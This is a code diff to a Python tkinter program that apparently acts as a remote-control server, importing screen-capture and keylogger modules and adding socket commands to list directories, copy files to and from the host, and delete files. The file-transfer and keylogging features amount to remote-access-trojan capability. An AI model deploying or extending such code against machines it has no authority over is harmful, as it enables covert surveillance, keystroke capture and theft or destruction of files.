@@ -1,9 +1,10 @@
 import tkinter as tk
-import socket, pickle, PIL.ImageGrab, psutil, struct, uuid
+import socket, pickle, PIL.ImageGrab, struct, uuid
 import os, json, re, winreg, threading, subprocess
 import numpy as np
 from pynput.keyboard import Listener
 import keylogger_server as kl 
+import directory_tree_server as dt
 
 main = tk.Tk()
 main.geometry("200x200")
@@ -41,7 +42,43 @@ def live_screen():
     return
 
 def directory_tree():
-    return
+    global client 
+    isMod = False
+    
+    while True:
+        if not isMod:
+            mod = client.recv(BUFSIZ).decode()
+
+        if (mod == "SHOW"):
+            client.sendall("OK".encode())
+            while True:
+                check = dt.sendListDirs(client)
+                if not check[0]:    
+                    mod = check[1]
+                    if (mod != "error"):
+                        isMod = True
+                        break
+        
+        # copy file from client to server
+        elif (mod == "COPYTO"):
+            client.sendall("OK".encode())
+            dt.copyFile(client)
+            isMod = False
+
+        # copy file from server to client
+        elif (mod == "COPY"):
+            client.sendall("OK".encode())
+            dt.copyFileTo(client)
+            isMod = False
+
+        elif (mod == "DEL"):
+            client.sendall("OK".encode())
+            dt.delFile(client)
+            isMod = False
+
+        else:
+            return
+
 #Connect
 ###############################################################################           
 def Connect():
